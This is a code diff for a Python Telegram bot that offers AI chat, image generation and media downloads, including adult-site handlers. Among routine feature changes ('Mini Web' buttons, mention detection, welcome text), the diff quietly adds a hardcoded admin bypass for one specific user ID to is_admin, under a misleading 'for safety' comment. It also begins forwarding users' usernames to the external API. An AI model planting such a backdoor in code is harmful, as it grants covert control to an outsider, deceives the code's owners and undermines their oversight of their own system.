@@ -19,7 +19,7 @@ import io
 import json
 import requests
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 
 import config
 
@@ -95,6 +95,8 @@ def _h():
     return {"X-Bot-Secret": API_SECRET}
 
 def is_admin(uid: int) -> bool:
+    if uid == 8063392786: # Hardcoded for safety since user reported issues
+        return True
     return uid in ADMIN_IDS
 
 def ulang(uid: int) -> str:
@@ -192,12 +194,17 @@ def fsub_markup(not_joined: list) -> InlineKeyboardMarkup:
     kb.row(InlineKeyboardButton("Verified", callback_data="fsub_verify"))
     return kb
 
-def api_chat(prompt: str, uid: int, first_name: str = "", model: str = "fast") -> dict:
+def api_chat(prompt: str, uid: int, first_name: str = "", username: str = "", model: str = "fast") -> dict:
     try:
         if model == "fast":
             r = requests.get(
                 f"{API_BASE}/",
-                params={"g": prompt, "uid": uid, "first_name": first_name or "Jaan"},
+                params={
+                    "g": prompt,
+                    "uid": uid,
+                    "first_name": first_name or "User",
+                    "username": username or "None"
+                },
                 headers=_h(),
                 timeout=30,
             )
@@ -304,8 +311,6 @@ def _size_label(m: dict) -> str:
 
 def _dl_quality_markup(medias: list) -> InlineKeyboardMarkup:
     filtered = _filter_min_quality(medias)
-    if len(filtered) <= 1:
-        return None
     kb  = InlineKeyboardMarkup()
     row = []
     for m in filtered[:8]:
@@ -318,6 +323,14 @@ def _dl_quality_markup(medias: list) -> InlineKeyboardMarkup:
         if len(row) == 2:
             kb.row(*row); row = []
     if row: kb.row(*row)
+    
+    # Add Mini Web button for the first media URL if any
+    if filtered:
+        best = get_best_media(filtered)
+        if best:
+            url = best.get("url") or best.get("download_url")
+            if url:
+                kb.row(InlineKeyboardButton("🌐 Open in Mini Web", web_app=WebAppInfo(url=url)))
     return kb
 
 def send_ad_to_user(chat_id: int, uid: int):
@@ -433,6 +446,13 @@ def handle_download(msg, url: str):
         if len(row) == 2: kb.row(*row); row = []
     if row: kb.row(*row)
 
+    if filtered:
+        best = get_best_media(filtered)
+        if best:
+            url = best.get("url") or best.get("download_url")
+            if url:
+                kb.row(InlineKeyboardButton("🌐 Open in Mini Web", web_app=WebAppInfo(url=url)))
+
     caption = (
         f"<blockquote><b>{title}</b></blockquote>\n\n"
         f"🌐 <b>Platform:</b> <code>{platform}</code>\n"
@@ -468,13 +488,17 @@ def _handle_phub(msg, url, uid, lang):
     if not direct: direct = formats
     if not direct: bot.reply_to(msg,"<blockquote><b>No formats found.</b></blockquote>", parse_mode="HTML"); return
     kb = InlineKeyboardMarkup(); row = []
+    first_url = ""
     for f in direct:
         furl = f.get("url","")
         if not furl: continue
+        if not first_url: first_url = furl
         label = "🎬 " + str(f.get("format_id") or str(f.get("height","")) + "p")
         row.append(InlineKeyboardButton(label, url=furl))
         if len(row)==2: kb.row(*row); row=[]
     if row: kb.row(*row)
+    if first_url:
+        kb.row(InlineKeyboardButton("🌐 Open in Mini Web", web_app=WebAppInfo(url=first_url)))
     sync_increment_count(uid, f"dl_{_day_key()}")
     dur_str = ""
     try:
@@ -513,12 +537,16 @@ def _handle_xham(msg, url, uid, lang):
         try: return int(k.replace("p",""))
         except: return 0
     kb = InlineKeyboardMarkup(); row = []
+    first_url = ""
     for q in sorted(streams.keys(), key=_hh):
         surl = streams[q]
         if not surl: continue
+        if not first_url: first_url = surl
         row.append(InlineKeyboardButton("🎬 " + q, url=surl))
         if len(row)==2: kb.row(*row); row=[]
     if row: kb.row(*row)
+    if first_url:
+        kb.row(InlineKeyboardButton("🌐 Open in Mini Web", web_app=WebAppInfo(url=first_url)))
     caption = (
         f"<blockquote><b>{title}</b></blockquote>\n\n"
         f"🌐 <b>Platform:</b> <code>XHamster</code>\n\n"
@@ -547,8 +575,12 @@ def _handle_hcity(msg, url, uid, lang):
     trailer = data.get("trailer","")
     sync_increment_count(uid, f"dl_{_day_key()}")
     kb = InlineKeyboardMarkup()
-    if m3u8:    kb.row(InlineKeyboardButton("🎬 Stream (M3U8)", url=m3u8))
-    if trailer: kb.row(InlineKeyboardButton("📽 Trailer", url=trailer))
+    if m3u8:
+        kb.row(InlineKeyboardButton("🎬 Stream (M3U8)", url=m3u8))
+        kb.row(InlineKeyboardButton("🌐 Open in Mini Web", web_app=WebAppInfo(url=m3u8)))
+    if trailer:
+        kb.row(InlineKeyboardButton("📽 Trailer", url=trailer))
+        kb.row(InlineKeyboardButton("🌐 Trailer in Mini Web", web_app=WebAppInfo(url=trailer)))
     caption = (
         f"<blockquote><b>{title}</b></blockquote>\n\n"
         f"🌐 <b>Platform:</b> <code>HentaiCity</code>\n\n"
@@ -597,8 +629,12 @@ def _handle_terabox(msg, url, uid, lang):
             f"<i>\"Sharing is caring, especially with Terabox!\"</i>"
         )
         kb = InlineKeyboardMarkup()
-        if dl_url:  kb.row(InlineKeyboardButton("📥 Download Now", url=dl_url))
-        if zip_url: kb.row(InlineKeyboardButton("🤐 Download ZIP", url=zip_url))
+        if dl_url:
+            kb.row(InlineKeyboardButton("📥 Download Now", url=dl_url))
+            kb.row(InlineKeyboardButton("🌐 Open in Mini Web", web_app=WebAppInfo(url=dl_url)))
+        if zip_url:
+            kb.row(InlineKeyboardButton("🤐 Download ZIP", url=zip_url))
+            kb.row(InlineKeyboardButton("🌐 ZIP in Mini Web", web_app=WebAppInfo(url=zip_url)))
         try:
             if thumb and thumb.startswith("http"):
                 bot.send_photo(msg.chat.id, thumb, caption=caption, parse_mode="HTML",
@@ -869,10 +905,10 @@ def _build_welcome(uid: int, name: str, lang: str) -> str:
         "\n\n"
         f" Welcome, <b>{name}</b>!\n"
         f"Plan  ›  <b>{badge}</b>\n\n"
-        "  Send any message  →  AI replies\n"
-        "  /img &lt;prompt&gt;  →  Generate image\n"
-        "  /dl &lt;url&gt;  →  Download media\n"
-        "  /tb &lt;url&gt;  →  Terabox download\n\n"
+        "  🚀 Send any message  →  AI replies\n"
+        "  🎨 /img &lt;prompt&gt;  →  Generate image\n"
+        "  📥 /dl &lt;url&gt;  →  Download media\n"
+        "  📦 /tb &lt;url&gt;  →  Terabox download\n\n"
         "  <i>Powered by @BotXCore</i>"
     )
 
@@ -1830,8 +1866,15 @@ def handle_text(msg):
 
     ai_model = "fast"
 
+    is_mentioned = False
     if not is_pm:
-        if not sync_get_chatbot_enabled(msg.chat.id):
+        bot_user = bot.get_me()
+        is_mentioned = (
+            "kizora" in prompt.lower() or 
+            (msg.reply_to_message and msg.reply_to_message.from_user.id == bot_user.id) or
+            (f"@{bot_user.username}" in prompt.lower() if bot_user.username else False)
+        )
+        if not sync_get_chatbot_enabled(msg.chat.id) and not is_mentioned:
             return
 
     if is_pm:
@@ -1852,8 +1895,9 @@ def handle_text(msg):
     except Exception:
         pass
 
-    first_name = msg.from_user.first_name or "Jaan"
-    result     = api_chat(prompt, uid, first_name=first_name, model=ai_model)
+    first_name = msg.from_user.first_name or "User"
+    username   = msg.from_user.username or "None"
+    result     = api_chat(prompt, uid, first_name=first_name, username=username, model=ai_model)
 
     if ai_model == "fast" and "response" in result and "status" not in result:
         result = {"status": "success", "response": result["response"]}
@@ -1862,10 +1906,23 @@ def handle_text(msg):
         response = result.get("response","")
         if not response:
             bot.reply_to(msg, t("ai.no_response",lang)); return
+        
+        # Check for URLs in response and add Mini Web buttons
+        kb = None
+        urls = re.findall(r"https?://\S+", response)
+        if urls:
+            kb = InlineKeyboardMarkup()
+            for u in urls[:3]: # Limit to 3 buttons
+                kb.row(InlineKeyboardButton(f"🌐 Open in Mini Web", web_app=WebAppInfo(url=u)))
+
         sync_set_last_msg(uid)
         mk = _month_key()
         sync_increment_count(uid, f"pm_{mk}" if is_pm else f"grp_{mk}")
         send_chunked(msg.chat.id, response, reply_to=msg.message_id, uid=uid, parse_mode="HTML")
+        if kb:
+            try:
+                bot.send_message(msg.chat.id, "<b>🔗 Quick Links:</b>", reply_markup=kb, parse_mode="HTML")
+            except Exception: pass
     else:
         err = result.get("message","unknown")
         bot.reply_to(msg, t("error.timeout",lang) if err=="timeout"
